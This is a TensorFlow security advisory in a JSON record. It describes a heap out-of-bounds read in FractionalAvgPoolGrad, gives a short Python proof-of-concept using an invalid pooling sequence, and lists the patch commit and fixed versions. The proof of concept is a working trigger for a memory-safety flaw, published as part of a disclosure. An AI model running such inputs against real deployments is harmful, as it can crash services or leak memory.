{"description": "### Impact \nThe [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape=[2,2,2,2],\n    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],\n    row_pooling_sequence=[-10,1,2,3],\n    col_pooling_sequence=[1,2,3,4],\n    overlapping=True)\n  return y\n    \ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.", "methods": ["Read from outside of bounds of heap."]}
